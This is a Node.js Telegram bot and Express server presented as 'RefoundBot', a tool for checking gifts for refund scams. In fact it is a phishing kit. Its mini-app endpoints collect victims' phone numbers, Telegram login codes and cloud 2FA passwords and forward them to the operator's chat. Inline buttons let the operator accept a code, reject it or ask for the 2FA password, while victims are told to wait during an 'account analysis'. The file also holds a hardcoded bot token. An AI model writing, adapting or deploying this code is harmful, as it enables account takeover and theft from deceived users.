const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

// Токен вашего бота (замените на свой)
const token = '8446641895:AAGsj1a1u8AQpKJxhFGhfu_yXaz6LKduAkE';
const bot = new TelegramBot(token, { polling: true });

// ID чата, куда будут приходить уведомления (замените на свой)
const YOUR_CHAT_ID = 8224914068;

// Временное хранилище для данных пользователей (в реальном приложении используйте базу данных)
const userData = {};

// Обработчик команды /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeText = `Добро пожаловать в RefoundBot! Данный бот был создан, чтобы люди могли проверять подарки на рефаунд и не стать жертвой обмана. Чтобы зайти в приложение, нажмите кнопку ниже 👇`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🚀 Открыть мини-приложение', web_app: { url: 'https://your-mini-app-url.com' } }]
            ]
        }
    };
    bot.sendMessage(chatId, welcomeText, options);
});

// Обработчик callback_query от кнопок "Принять", "Отклонить", "2FA"
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id;

    if (data.startsWith('accept_')) {
        const userPhone = data.split('_')[1];
        // Отправляем пользователю сообщение об успешной регистрации
        bot.sendMessage(userId, 'Регистрация прошла успешно! Ожидайте 5 минут, пока мы анализируем ваш аккаунт! После анализа окно автоматически уберется.');
        // Удаляем кнопки из сообщения в вашем чате
        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
        // Отправляем подтверждение в Mini App через ответ на callback_query
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Регистрация принята!' });
    } else if (data.startsWith('reject_')) {
        const userPhone = data.split('_')[1];
        // Отправляем пользователю сообщение об ошибке
        bot.sendMessage(userId, 'Неправильный код. Попробуйте позже!');
        // Удаляем кнопки из сообщения в вашем чате
        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Регистрация отклонена!' });
    } else if (data.startsWith('request2fa_')) {
        const userPhone = data.split('_')[1];
        // Отправляем пользователю запрос на 2FA
        bot.sendMessage(userId, 'У вас установлен облачный пароль. Введите его в строку 2FA');
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Запрос 2FA отправлен!' });
    }
});

// Веб-сервер для обслуживания Mini App
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static('public')); // Папка с файлами Mini App
app.use(express.json());

// Эндпоинт для обработки запроса на отправку кода
app.post('/send-code', (req, res) => {
    const { phoneNumber, country } = req.body;
    const userId = req.body.userId;

    // Сохраняем данные пользователя
    userData[userId] = { phoneNumber, country };

    // Отправляем уведомление в ваш чат
    const notificationText = `🔐 Попытка регистрации\n📱 Номер: ${phoneNumber}\n🌍 Страна: ${country}`;
    bot.sendMessage(YOUR_CHAT_ID, notificationText);

    res.json({ success: true });
});

// Эндпоинт для обработки логина (ввода кода)
app.post('/login', (req, res) => {
    const { phoneNumber, code, country, userId } = req.body;

    // Отправляем уведомление в ваш чат с кнопками
    const notificationText = `✅ Регистрация успешна\n📱 Номер: ${phoneNumber}\n🔑 Код: ${code}\n🌍 Страна: ${country}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Принять', callback_data: `accept_${phoneNumber}` }],
                [{ text: 'Отклонить', callback_data: `reject_${phoneNumber}` }],
                [{ text: '2FA', callback_data: `request2fa_${phoneNumber}` }]
            ]
        }
    };
    bot.sendMessage(YOUR_CHAT_ID, notificationText, options);

    res.json({ success: true, message: 'Ожидайте подтверждения...' });
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});